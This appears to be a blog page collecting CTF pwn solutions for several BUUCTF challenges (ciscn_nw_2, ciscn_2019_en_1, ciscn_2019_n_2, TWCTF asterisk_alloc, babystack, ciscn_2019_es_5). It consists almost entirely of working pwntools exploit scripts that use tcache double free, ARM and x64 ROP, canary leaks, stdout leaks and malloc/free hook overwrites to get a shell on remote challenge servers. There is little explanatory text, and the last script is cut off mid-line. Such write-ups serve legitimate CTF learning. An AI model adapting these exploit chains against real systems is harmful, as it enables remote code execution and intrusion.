<h2 id="0x61-ciscn-nw-2"><a href="#0x61-ciscn-nw-2" class="headerlink" title="0x61 ciscn_nw_2"></a>0x61 ciscn_nw_2</h2><h3 id="Ubuntu-18-04-1"><a href="#Ubuntu-18-04-1" class="headerlink" title="Ubuntu 18.04"></a>Ubuntu 18.04</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_nw_2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(title,content):</span><br><span class="line">	sh.recvuntil(">> ")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("title:")</span><br><span class="line">	sh.send(title)</span><br><span class="line">	sh.recvuntil("content:")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(">> ")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_nw_2")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)		</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/libc-2.27.so")</span><br><span class="line">	chunk_offset = 0x202040</span><br><span class="line">	add('\x11' * 8,'\x12' * 0x68)</span><br><span class="line">	add('\x21' * 8,'\x22' * 0x68)</span><br><span class="line">	free(0)</span><br><span class="line">	free(0)</span><br><span class="line">	add('\x80','\n')</span><br><span class="line">	heap_base = u64(sh.recvuntil("\x20\n",True)[-6:].ljust(8,"\x00")) - 0x280</span><br><span class="line">	add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">	add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">	payload  = ('\xf9' * 0x8) * 6</span><br><span class="line">	payload += p64(0x250 - 0x50 + 1) + p64(0) * 4 + p64(heap_base + 0x60)</span><br><span class="line">	add('\xaa' * 0x8,payload)</span><br><span class="line">	payload = p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">	add(p64(0),payload)</span><br><span class="line">	free(6)</span><br><span class="line">	payload = p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">	add('\n',payload)</span><br><span class="line">	libc = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00')) + 0x30 - lib.symbols['__malloc_hook'] - 0xa</span><br><span class="line">	__malloc_hook = libc + lib.symbols['__malloc_hook']</span><br><span class="line">	payload = p64(0) * 3 + p64(__malloc_hook)</span><br><span class="line">	add(p64(0),payload)</span><br><span class="line">	one_gadget = [0x4f2c5,0x4f322,0x10a38c]</span><br><span class="line">	add(p64(libc + one_gadget[1]),'\n')</span><br><span class="line">	sh.recvuntil(">> ")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	if debug == 1:</span><br><span class="line">		log.success("pid = " + str(sh.pid))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node2.buuoj.cn.wetolink.com",28979,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x62-ciscn-2019-en-1"><a href="#0x62-ciscn-2019-en-1" class="headerlink" title="0x62 ciscn_2019_en_1"></a>0x62 ciscn_2019_en_1</h2><h3 id="标准的arm-pwn-rop，很适合新手"><a href="#标准的arm-pwn-rop，很适合新手" class="headerlink" title="标准的arm pwn rop，很适合新手"></a>标准的arm pwn rop，很适合新手</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.binary = "ciscn_2019_en_1"</span><br><span class="line">elf = ELF("ciscn_2019_en_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_en_1")</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">	pop_r3_pc = 0x000103a4</span><br><span class="line">	pop_r4_pc = 0x000104f8</span><br><span class="line">	pop_r4_2_r10_pc_ret = 0x00010638</span><br><span class="line">	printf_got = 0x00021010</span><br><span class="line">	offset = 36</span><br><span class="line">	fmt = 0x00010660</span><br><span class="line">	call_gadget = 0x0001061C</span><br><span class="line">	payload = offset * 'a'</span><br><span class="line">	payload += p32(pop_r4_2_r10_pc_ret)</span><br><span class="line">	payload += p32(0)#r4</span><br><span class="line">	payload += p32(printf_got)#r5</span><br><span class="line">	payload += p32(0)#r6</span><br><span class="line">	payload += p32(fmt)#r7</span><br><span class="line">	payload += p32(printf_got)#r8</span><br><span class="line">	payload += p32(0)#r9</span><br><span class="line">	payload += p32(0)#r10</span><br><span class="line">	payload += p32(call_gadget)</span><br><span class="line">	payload += p32(0x00010590)*10</span><br><span class="line">	sh.sendafter(":",payload)</span><br><span class="line">	sh.recvuntil("hello")</span><br><span class="line">	sh.recvuntil("hello ")</span><br><span class="line">	printf = u32(sh.recv(4))</span><br><span class="line">	libc_r0_ret = 0x0010dc84</span><br><span class="line">	libc = printf - lib.symbols['printf']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	payload = offset * 'a'</span><br><span class="line">	payload += p32(libc + libc_r0_ret) + p32(binsh) + p32(system)</span><br><span class="line">	sh.sendafter(":",payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node2.buuoj.cn.wetolink.com",28562,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x63-ciscn-2019-n-2"><a href="#0x63-ciscn-2019-n-2" class="headerlink" title="0x63 ciscn_2019_n_2"></a>0x63 ciscn_2019_n_2</h2><h3 id="Ubuntu-18-04-2"><a href="#Ubuntu-18-04-2" class="headerlink" title="Ubuntu 18.04"></a>Ubuntu 18.04</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_n_2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def addUser(name,age):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("name:")</span><br><span class="line">	sh.send(name)</span><br><span class="line">	sh.recvuntil("age:")</span><br><span class="line">	sh.send(str(age))</span><br><span class="line">	sh.recvuntil("idx: ")</span><br><span class="line">	return int(sh.recv(1),10)</span><br><span class="line">def deleteUser(idx):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("Index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def editUser(idx,name,age):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil("Index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil("name:")</span><br><span class="line">	sh.send(name)</span><br><span class="line">	sh.recvuntil("age:")</span><br><span class="line">	sh.send(str(age))</span><br><span class="line">def addMoney(idx):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("5")</span><br><span class="line">	sh.recvuntil("Index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def buyGift(idx,addr,size):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("6")</span><br><span class="line">	sh.recvuntil("Index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil("input the address you want to leak:")</span><br><span class="line">	sh.sendline(hex(addr))</span><br><span class="line">	sh.recvuntil("input the size you want to leak:")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">def showUser(idx):</span><br><span class="line">	sh.recvuntil("Your choice: ")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil("Index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_n_2")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	chunk_list = 0x602060</span><br><span class="line">	heap_base = 0x603000</span><br><span class="line">	addUser('\x11' * 8,0x10)</span><br><span class="line">	deleteUser(0)</span><br><span class="line">	deleteUser(0)</span><br><span class="line">	addUser(p64(chunk_list),heap_base)</span><br><span class="line">	addUser(p64(chunk_list),heap_base)</span><br><span class="line">	addUser(p64(0x602070 + 8),0x603250)</span><br><span class="line">	buyGift(0,elf.got['__libc_start_main'],8)</span><br><span class="line">	__libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">	__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">	editUser(2,p64(binsh),__free_hook)</span><br><span class="line">	editUser(1,p64(system),1)</span><br><span class="line">	deleteUser(0)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node2.buuoj.cn.wetolink.com",28334,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x64-TWCTF-online-2019-asterisk-alloc"><a href="#0x64-TWCTF-online-2019-asterisk-alloc" class="headerlink" title="0x64 TWCTF_online_2019_asterisk_alloc"></a>0x64 TWCTF_online_2019_asterisk_alloc</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.binary = "TWCTF_online_2019_asterisk_alloc"</span><br><span class="line">elf = ELF("TWCTF_online_2019_asterisk_alloc")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def malloc(size,content):</span><br><span class="line">    sh.sendlineafter("Your choice: ","1")</span><br><span class="line">    sh.sendlineafter("Size:",str(size))</span><br><span class="line">    sh.sendafter("Data:",content)</span><br><span class="line">def calloc(size,content):</span><br><span class="line">    sh.sendlineafter("Your choice: ","2")</span><br><span class="line">    sh.sendlineafter("Size:",str(size))</span><br><span class="line">    sh.sendafter("Data:",content)</span><br><span class="line">def realloc(size,content):</span><br><span class="line">    sh.sendlineafter("Your choice: ","3")</span><br><span class="line">    sh.sendlineafter("Size:",str(size))</span><br><span class="line">    sh.sendafter("Data:",content)</span><br><span class="line">def free(index):</span><br><span class="line">    sh.sendlineafter("Your choice:","4")</span><br><span class="line">    sh.sendlineafter("Which: ",str(index))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./TWCTF_online_2019_asterisk_alloc")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/libc-2.27.so")</span><br><span class="line">    realloc(0x88,'\n')</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x68,'\n')</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x88,'aaaaaaa')</span><br><span class="line">    offset = lib.symbols['_IO_2_1_stdout_'] % 0x10000</span><br><span class="line">    for i in range(7):</span><br><span class="line">        free("r")</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x58,p16(offset))</span><br><span class="line">    calloc(0x28,'/bin/sh\x00')</span><br><span class="line">    malloc(0x88,p16(offset))</span><br><span class="line">    realloc(0,'')</span><br><span class="line">    realloc(0x88,p64(0xfbad1800) + p64(0) * 3 + "\x00")</span><br><span class="line">    sh.recvuntil(p64(0xfbad1800) + p64(0) * 3)</span><br><span class="line">    libc = u64(sh.recv(8)) - lib.symbols['_IO_2_1_stdout_'] + 0x60</span><br><span class="line">    __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">    system = libc + lib.symbols['system']</span><br><span class="line">    free("m")</span><br><span class="line">    realloc(-1,'')</span><br><span class="line">    realloc(0x58,p64(__free_hook))</span><br><span class="line">    realloc(-1,'')</span><br><span class="line">    realloc(0x58,p64(__free_hook))</span><br><span class="line">    realloc(-1,'')</span><br><span class="line">    realloc(0x58,p64(system))</span><br><span class="line">    free("c")</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node2.buuoj.cn.wetolink.com",28993,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x65-other-babystack"><a href="#0x65-other-babystack" class="headerlink" title="0x65 other_babystack"></a>0x65 other_babystack</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Author xynm</span><br><span class="line">#import xynm_pwn_util</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">#log_level['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span><br><span class="line">context.log_level = b"CRITICAL"</span><br><span class="line">binary_file      = b'babystack'</span><br><span class="line">remote_libc_file = b'libc-2.23.so'</span><br><span class="line">remote_ip        = b'node3.buuoj.cn'</span><br><span class="line">local_libc_file  = b'/lib/x86_64-linux-gnu/libc.so.6'</span><br><span class="line">remote_port      = 28676</span><br><span class="line">context.binary   = binary_file</span><br><span class="line">context.terminal = [b'tmux', b'sp', b'-h']</span><br><span class="line">def exploit(sh,awd = False):</span><br><span class="line">        def debug(gdb_script):</span><br><span class="line">                gdb.attach(sh,gdb_script)</span><br><span class="line">        global binary_file,remote_libc_file,remote_ip,remote_port</span><br><span class="line">        elf = context.binary</span><br><span class="line">        if(remote == True):</span><br><span class="line">                lib = ELF(remote_libc_file) if remote_libc_file != b'' else ""</span><br><span class="line">        else:</span><br><span class="line">                lib = elf.libc if local_libc_file == b"" else ELF(local_libc_file)</span><br><span class="line">        if context.arch == b"amd64":</span><br><span class="line">                pop_rdi_ret = elf.search(asm(b"pop rdi ; ret")).next()</span><br><span class="line">                pop_rsi_r15_ret = elf.search(asm(b"pop rsi ; pop r15 ; ret")).next()</span><br><span class="line">        elif context.arch == b"i386":</span><br><span class="line">                pop_ebp_ret = elf.search(asm(b"pop ebp ; ret")).next()</span><br><span class="line">                pop3_ret    = elf.search(asm(b"pop esi ; pop edi ; pop ebp ; ret")).next()</span><br><span class="line">        s       = lambda data               :sh.send(str(data))</span><br><span class="line">        sa      = lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">        sl      = lambda data               :sh.sendline(str(data))</span><br><span class="line">        sla     = lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">        r       = lambda numb=4096          :sh.recv(numb)</span><br><span class="line">        ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)</span><br><span class="line">        irt     = lambda                    :sh.interactive()</span><br><span class="line">        uu32    = lambda data               :u32(data.ljust(4, b'\x00'))</span><br><span class="line">        uu64    = lambda data               :u64(data.ljust(8, b'\x00'))</span><br><span class="line">        ru7f    = lambda                    :u64(sh.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))</span><br><span class="line">        ruf7    = lambda                    :u32(sh.recvuntil("\xf7")[-4:].ljust(4,b'\x00'))</span><br><span class="line">        lg      = lambda data               :log.success(data)</span><br><span class="line">        sla(">>","1")</span><br><span class="line">        s('a' * (0x88 + 1))</span><br><span class="line">        sla(">>","2")</span><br><span class="line">        ru(0x88 * "a")</span><br><span class="line">        canary = uu64(r(8))</span><br><span class="line">        canary -= 0x61</span><br><span class="line">        sla(">>","1")</span><br><span class="line">        payload = 'a' * 0x88</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += 'a' * 0x8</span><br><span class="line">        payload += p64(pop_rdi_ret)</span><br><span class="line">        payload += p64(elf.got['__libc_start_main'])</span><br><span class="line">        payload += p64(elf.plt['puts'])</span><br><span class="line">        payload += p64(0x0000000000400908)</span><br><span class="line">        s(payload)</span><br><span class="line">        sla(">>","3")</span><br><span class="line">        __libc_start_main = ru7f()</span><br><span class="line">        libc = __libc_start_main - lib.symbols[b'__libc_start_main']</span><br><span class="line">        lib.address = libc</span><br><span class="line">        system = lib.symbols[b'system']</span><br><span class="line">        binsh = lib.search(b"/bin/sh\x00").next()</span><br><span class="line">        __free_hook = lib.symbols[b'__free_hook']</span><br><span class="line">        __malloc_hook = lib.symbols[b'__malloc_hook']</span><br><span class="line">        __realloc_hook = lib.symbols[b'__realloc_hook']</span><br><span class="line">        one_gadget = []</span><br><span class="line">        sla(">>","1")</span><br><span class="line">        payload = 'a' * 0x88</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += 'a' * 0x8</span><br><span class="line">        payload += p64(pop_rdi_ret)</span><br><span class="line">        payload += p64(binsh)</span><br><span class="line">        payload += p64(system)</span><br><span class="line">        s(payload)</span><br><span class="line">        sla(">>","3")</span><br><span class="line"></span><br><span class="line">        if awd != True:</span><br><span class="line">                irt()</span><br><span class="line">if __name__ == b"__main__":</span><br><span class="line">        exploit(remote(remote_ip,remote_port),remote = True)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x66-ciscn-2019-es-5"><a href="#0x66-ciscn-2019-es-5" class="headerlink" title="0x66 ciscn_2019_es_5"></a>0x66 ciscn_2019_es_5</h2><h3 id="0堆块和realloc函数之间的冲突导致double-free"><a href="#0堆块和realloc函数之间的冲突导致double-free" class="headerlink" title="0堆块和realloc函数之间的冲突导致double free"></a>0堆块和realloc函数之间的冲突导致double free</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_es_5")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">    sh.sendlineafter("Your choice:","1")</span><br><span class="line">    sh.sendlineafter(">",str(size))</span><br><span class="line">    if(size != 0):</span><br><span class="line">        sh.sendafter(":",content)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sh.sendlineafter("Your 